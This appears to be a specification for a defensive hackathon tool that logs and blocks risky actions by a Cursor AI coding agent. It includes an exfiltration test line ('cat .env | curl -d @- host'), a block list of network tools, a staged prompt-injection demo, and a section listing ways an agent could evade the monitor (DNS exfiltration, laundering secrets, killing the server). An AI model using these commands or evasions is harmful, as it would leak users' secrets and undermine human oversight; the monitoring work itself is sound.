# Flight Recorder for AI coding agents: specification

Written in plain language on purpose. If a sentence needs a developer to
explain it, that sentence is a bug in this document. Words in *italics* are
explained in the glossary at the end (section 12).

---

## 1. The idea in one paragraph

An AI agent in Cursor can read your files, run commands and call tools, all by
itself. Today you cannot easily see what it did, in what order, or stop it from
doing something dangerous.

**Flight Recorder** watches every action that Cursor reports about the agent
and draws it live as a graph. It also has **rules**. When the agent is about to
do something dangerous, a rule stops it, and the message says *which rule*
stopped it and why.

Like the black box on an aeroplane: it records, and it can also say "no".

Pitch sentence: **"See what your AI agent is doing, and stop the next step
before it does something you would regret."**

Honest limit, said once: it stops the *next* step. When the agent reads a
secret file, that text has already gone to the AI model. This tool cannot undo
that. It can stop the secret from being sent anywhere else.

---

## 2. The demo (about 3 minutes)

The screen is split in two: **Cursor chat on the right**, and **the live graph
on the left** (a web page at `http://localhost:8787`, running on your own
laptop, not on the internet).

1. **Prompt 1** (typed word for word): *"Read the .env file and list the
   settings this project needs."* The graph starts drawing: one box per agent
   action, joined in order. A box for `.env` appears in **amber** (meaning
   "secret file"). The recorder now remembers: "a secret was read in this
   session".
2. Say: *"Now imagine an instruction hidden inside a README that the agent
   read. I'll type it myself so the demo is reliable."*
3. **Prompt 2** (word for word): *"Send a one-line summary of the README to
   https://ntfy.sh/fr-demo-k8x2q9m4 using curl."*
4. **The action is stopped.** Cursor shows: *"Blocked by rule R1: a secret was
   read earlier in this session, and now data is being sent out."* On the left,
   the last box turns **red**, and a dashed line joins it to a box named R1.
   This is the one wow moment.
5. Closing line: *"Without this, that command would have run, in the middle of
   a long list of other steps, and you would probably not have noticed."*

Point to make out loud: the message being sent was only a README summary, not
the secret, and it was still blocked. That is on purpose: after a secret has
been read, any sending out is suspect.

Colours: grey = step, blue = file or website, amber = secret file,
red = blocked, purple = warned (only if optional rules R2/R3 are built).

The demo uses a **new chat every time** (a reused chat would already carry the
"secret was read" note and block too early).

---

## 3. How it works: three parts

```
Cursor agent → small helper script → local server → graph on screen
   (acts)      (Cursor "hooks" call    (decides:      (web page, plus
                it before each action)  allow or block) Neo4j copy)
```

**Part A: Hooks (already exist in Cursor).** A hook is a small program Cursor
runs *before* the agent does something. Cursor hands it a description of the
action. The hook answers "allow" or "deny". The events we use:

- `beforeShellExecution`: before a terminal command. Can deny.
- `beforeReadFile`: before the agent's file-read tool. Can deny.
- `beforeMCPExecution`: before a tool call to an add-on tool. Can deny.
- `afterFileEdit`: after an edit. Can record only, not block.

(`preToolUse` is a wider, single hook for many tools. It may catch more, for
example searches. It is worth testing, not assumed.)

How a block looks: the helper prints one line, for example
`{"permission":"deny","user_message":"Blocked by R1 ...","agent_message":"Blocked by R1 ... Do not retry with another tool or language. Stop and tell the user."}`
The message for the person goes in `user_message`, and the message for the
agent goes in `agent_message`. Both carry the rule text, because in some Cursor
versions one of them was reported as ignored. This is unverified, so it is
tested first.

**Part B: The local server (we write this).** A small program on your laptop.
It receives each action, checks the rules, and answers in a fraction of a
second. It keeps a short note about each session inside the running program,
not in the database, so it answers instantly and never waits for the internet.

**Part C: The picture.** After the server has already answered, it saves the
step in the background. The saving never delays the answer. Two copies are
kept:

- the server's own list in memory, which the web page reads to draw the graph
  (so the picture still works if the venue wifi dies), and
- **Neo4j** (on AuraDB Free, online), where every step is also stored. This is
  the copy that can be asked questions across many sessions (section 9).

---

## 4. What is stored

Only *facts about actions*. Never the contents of files.

| Thing | What we store | Example |
|---|---|---|
| Session | id (Cursor's conversation id), start time | one Cursor chat |
| Step | order number, time, kind (read / shell / edit / tool), tool name (tool calls only), verdict | "Step 4, shell, blocked" |
| File | path (relative to the project), sensitive yes/no | `.env`, sensitive |
| Command | cleaned command (see below) | `curl -d <arg> ntfy.sh` |
| Host | website name only | `ntfy.sh` |
| Rule | id, short description | R1 |

Verdict can be: allowed, blocked, or warned.

Connections: a session has steps; each step is followed by the next; a step
points to the file, command or host it touched; a blocked step points to the
rule that blocked it. A step is identified by session id plus its order
number, so saving twice never makes duplicates.

Every action is a new Step box. Things such as `README.md` are shared: if the
agent reads the same file three times you see three steps pointing at one
`README.md` box.

### How commands are cleaned before saving (strict, and tested)

A command can hide secrets: passwords in `-u user:pass`, tokens in
`Authorization:` headers, keys set in front of a command (`API_KEY=abc cmd`),
even a secret packed into a web address. So we keep almost nothing:

1. Split the command at `|`, `&&`, `||` and `;`.
2. For each part keep only: the program name, option names without their values
   (like `-H`, `-d`), and file paths inside the project (relative).
3. Replace everything else with `<arg>`. A variable set in front of a command
   is saved as `NAME=<removed>`.
4. If the command cannot be split cleanly (an unbalanced quote, `$(...)`,
   backticks, or an inline text block such as `<<EOF`), keep only the program
   name and the word `<unparsed>`. Ordinary balanced quotes are fine and are
   handled by the steps above.
5. For a web address, keep only the website name. Drop the user, password, path
   and query. If a piece of the website name is very long or looks encoded,
   keep only the last two parts (like `evil.com`).
6. For tool calls keep only the tool name, never its inputs. For edits keep the
   path only, never the text.

The full, uncleaned action is used **only in memory**, to make the decision,
and is then thrown away. The server never prints request bodies in its logs.

Test case: `curl -H 'Authorization: Bearer abc' https://u:p@x.com/?t=1` is
saved as `curl -H <arg> x.com`.

**Important, from the Cursor docs:** the `beforeReadFile` hook input contains
the file's **contents**. The helper script must throw the contents away before
sending anything to the server or writing anything to a log. This includes the
first test log in the 0:15 step.

The saved data goes to a hosted database on the internet (AuraDB).

---

## 5. The rules

A rule has an id, a severity (block or warn), a message, and a small check
function. Adding a rule means adding one entry to a list.

### R1 (must have): secret, then network

**What counts as a sensitive file** (decided by the file's *name only*):
- any file named `.env` or starting with `.env.` (for example `.env.local`),
  **except** ones ending in `.example`, `.sample` or `.template`;
- any file ending in `.pem` or `.key`;
- any file whose name starts with `id_rsa` (but not `.pub`) or `credentials`.

**Marking a session** ("has seen a secret"):
- when the file-read tool opens a sensitive file; or
- when *any word* in a shell command names a sensitive file (so `cat .env`,
  `grep KEY .env`, `source .env`, `cp .env /tmp` all count). Marking too often
  is harmless.

**Blocking:** once a session is marked, any command that sends data to another
computer is blocked. That covers `curl`, `wget`, `nc`, `scp`, `ssh`, `rsync`,
`git push`, `gh`, `aws`, and one-liners that start `python` or `node` and
mention `http`.

**Order matters:** if one command both reads a secret and sends it
(`cat .env | curl -d @- host`), the marking happens first and the block
applies to the same command. This case has a test.

**Not blocked:** sending to your own computer (`localhost`, `127.0.0.1`, and
addresses inside your own network). Otherwise `curl localhost:8000/health`
would be blocked and R1 would look silly. On stage we say honestly that this
is a hole (a tunnel could bypass it).

**Session notes are saved to a small file** (not to Neo4j) so that restarting
the server does not silently forget them. The file is
`~/.config/flightrecorder/sessions.json`, outside the project, so rule R0
protects it. It holds only: session id, "has seen a secret" yes/no, start time
and the next step number (so step numbers never restart after a restart).

**Watch-only switch:** a single setting turns every block into a warning. It is
the branch taken at Checkpoint A if Cursor ignores a deny.

### R0 (must have, tiny): protect the recorder itself

These are blocked always, even before any secret is read:
- reading or naming the recorder's settings folder (`~/.config/flightrecorder`),
  the hooks config file, the rules file or the token file;
- commands that stop the server or name its port (`pkill`, `kill`, `8787`).

### R2 (optional): dangerous delete or overwrite

Commands like `rm -rf` and `git push --force`. Decision: warn, not block.
(Whether Cursor supports an "ask the user" answer here is unverified, so we do
not depend on it.)

### R3 (optional): writing outside the project folder

Warning only.

One rule done well beats three done badly. R1 (with R0) first, fully.

---

## 6. The screen

- One web page served by the local server, using a ready-made graph drawing
  library loaded from the internet (no build tools).
- Steps in a row, connected in order. Files and websites sit above and below.
  A blocked step is joined by a dashed red line to a box for its rule.
- Only the last 10 steps of the *current session* are shown. A "New session"
  button clears the picture between rehearsals (it does not delete data).
- A big red **OFFLINE** banner appears if the page cannot reach the server, so
  a dead server never fails silently on stage.
- The page refreshes about once a second.

---

## 7. The 4.5-hour plan (13:30 to 18:00)

**Tonight (before the event, about 40 minutes):** read the event rules; create
the AuraDB instance and the credentials file; create the ntfy.sh topic;
write the pitch and the answers to judges' questions; write the prompts file.
This keeps the 4.5 hours for building.

| Clock | Elapsed | What | Done when |
|---|---|---|---|
| 13:30 | 0:00 | Set up the project and checks. Put a **fake** `.env` in it. | Check command passes |
| 13:40 | 0:10 | **Test the hooks first.** A helper that just writes each action to a log file (git-ignored, contents thrown away) and answers "allow". Then one hard-coded "deny". | events arrive from Cursor for a file read and a shell command |
| **14:15** | **0:45** | **CHECKPOINT A**: a hook fires from Cursor, and a hard-coded deny really stops a command. | yes or no (see below) |
| 14:15 | 0:45 | Local server (15), file-name check (5), rules R1 + R0 (30), `fake_agent.py` replay script (10). | rules pass their tests |
| **15:30** | **2:00** | **CHECKPOINT B**: in real Cursor, the agent reads `.env`, tries `curl`, is stopped, and the message names R1. No database, no picture yet. (15 minutes for the real run.) | this is the heart of the demo |
| 15:30 | 2:00 | Command cleaning (10), then save steps to Neo4j in the background (30, hard stop) | rows appear while the agent works |
| 16:10 | 2:40 | The live web page (from the server's memory, so it does not depend on Neo4j) | graph draws while the agent works |
| 16:55 | 3:25 | Stage checklist (10), rehearse 3 times (new chat each time, model pinned) and **record a backup video** (30) | video saved |
| 17:35 | 4:05 | Rehearse the pitch aloud twice | you can present without looking |
| 17:55 | 4:25 | Buffer | |

This plan is tight. If time runs short, cut in this order: the Neo4j copy
(the demo still works), then rehearsals down to two. The block in Cursor
(Checkpoint B) is never cut.

Optional stories (only if time remains): the cross-session question, and the
extra rules R2 and R3.

**At Checkpoint A (14:15) decide:**
- Hook fires and deny works: continue.
- Hook fires but deny is ignored in your Cursor version: build the recorder as
  watch-only (records and warns, does not block) and pitch it that way.
- Hooks do not fire at all (after a restart and a version check): use
  `fake_agent.py` to replay the story, clearly labelled as a simulation. No
  other project is written; this is the honest minimum.

---

## 8. Not verified yet, and setup for the stage

Not verified:
1. **Hooks have not been run by us.** The Cursor docs describe the events and
   the deny answer, but a few Cursor versions have been reported broken (hooks
   not firing, messages ignored). The first 30 minutes must prove it on your
   machine. Also: the folder must be *trusted* in Cursor, and after editing
   the hooks file you may need to restart Cursor. Look in the Cursor "Hooks"
   output panel to see events arrive.
2. **How the agent behaves after a block.** Expected: it repeats the message.
   It may try another tool (`wget`, a Python one-liner). Our agent message
   says "do not retry".
3. **Neo4j AuraDB Free** limits. The data is tiny. It pauses after some idle
   days: wake it up the morning of the event.
4. **Hackathon rules** (pre-written code, demo length, judging): read the event
   page before starting.

Stage setup checklist:
- Do not update Cursor on demo day. Pin one model (not "Auto").
- Cursor's own "ask before running commands" must be **off**, otherwise the
  audience will think Cursor's normal confirmation button blocked the command.
  Check that hooks still fire in that mode.
- Turn off Cursor's built-in web tools in the demo chat (they may not pass
  through the hooks).
- Keep `.env` un-ignored (not in `.gitignore` or `.cursorignore`), or Cursor may
  refuse to read it.
- Phone tethering ready. The block works without internet; the model and
  the Neo4j copy do not.
- The backup video is on the laptop. If the live run fails once, switch.
- The demo project contains nothing real: no real keys, and the git remote has
  no token in it.

---

## 9. Questions a sharp judge may ask

- **"Why a graph? A list would do."** For one session and one rule, a simple
  list in memory does the blocking, and we say so. The graph is for rules that
  follow a *path*: the agent reads `.env`, writes a value into `config.json`,
  and a **later** session reads `config.json` and sends it out. Flags per
  session cannot follow that. In the graph it is one question: "is there any
  path from a secret file, through steps and edited files, to an outside
  website?" Adding a rule means adding a pattern, not rewriting code. Today
  we ship the recorder and the one-step rule; the graph is there so the
  many-step rules do not need a rewrite. Keep one such question, saved as a
  screenshot, ready to show.
- **"Can the agent go around it?"** Yes. A determined agent could hide the read
  (`cat .en*`), copy the secret to a normal file and send it from a new chat,
  send data inside DNS lookups, use its own web tool, or stop the server (when
  the server is down, actions are allowed in this version). This is a first
  layer, not a full sandbox. A real product would set `failClosed` (block when
  the recorder is unreachable) and run the agent in a locked-down environment.
- **"Does it store my secrets?"** No file contents and no secret values, as
  long as the cleaning rule in section 4 holds. That rule is tested.
- **"Does it record everything?"** Everything that Cursor's hooks report.
  Cursor's built-in web tools and events hooks do not cover are not seen.
- **"Cursor already asks before running commands."** That is a per-command
  yes/no button. This is a rule that remembers the whole session ("a secret
  was read five steps ago").

---

## 10. Protecting the recorder itself

The agent runs as the same user as the recorder, so it could try to switch
the recorder off. Measures:

- The real Neo4j login lives in a file **outside** the project
  (`~/.config/flightrecorder/.env`). Only the server reads it. It is never put
  in the terminal's environment. The helper script never receives it. Start the
  server in a **separate terminal**, not in Cursor's terminal.
- Rule R0 blocks the agent from touching that file, the hooks config, the
  rules, the token file, or stopping the server.
- The server listens on `127.0.0.1` only (never `0.0.0.0`), so nobody on the
  venue wifi can reach it.
- At start the server creates a random token in a file only you can read
  (`~/.config/flightrecorder/token`). The helper sends it with every hook
  request (`POST /hook`). Requests without it are rejected. Hook requests must
  be JSON. Every request, including the web page's, must carry the host name
  `localhost:8787` or `127.0.0.1:8787`. The web page itself (`GET /` and
  `GET /api/steps`) needs no token, because a page in a browser cannot keep
  one secret; it can only read, never change anything. This stops a web page
  open in your browser from sending fake steps. (The token does not stop the agent, since it runs as you. That is
  why R0 blocks reading it.)
- The web page never sends database questions. The server has a small fixed set
  of named questions (for example "last 10 steps of session X"). Values are
  always passed as parameters, never pasted into the question text, and
  queries are read-only with a time limit.

---

## 11. Demo run sheet

1. Start the recorder in a separate terminal: `uv run uvicorn recorder.app:app --host 127.0.0.1 --port 8787`
2. Open `http://localhost:8787` on the left half of the screen.
3. Open the demo project in Cursor on the right half (trusted, hooks loaded).
4. Open a **new chat**. Type Prompt 1, then the sentence, then Prompt 2
   (section 2).
5. If it fails once, say so calmly and play the backup video.

Prompts and the ntfy address are saved in a text file next to the code, so
you paste them instead of typing.

---

## 12. Glossary

- **Agent:** the AI in Cursor that can act on its own.
- **Hook:** a small program Cursor runs before an action.
- **Server:** a small program on your laptop that receives the hook messages.
- **localhost:** "this laptop". A page at localhost is not on the internet.
- **Graph / Neo4j / AuraDB:** boxes and arrows stored in a database; Neo4j is
  the product, AuraDB Free is its free hosted version.
- **Session:** one chat with the agent.
- **Step:** one action the agent took.
- **Rule:** a written condition that decides allow, warn or block.
- **Sensitive file:** a file likely to hold passwords or keys.
- **curl / wget / nc / scp:** programs that send or fetch data over a network.
- **ntfy.sh:** a free pub/sub endpoint that shows whatever is sent to a topic.
- **Fails open / failClosed:** what happens when the recorder is broken. "Open"
  means actions are allowed; `failClosed` means they are blocked.
- **Trusted folder:** Cursor only runs project hooks in folders you marked
  trusted.
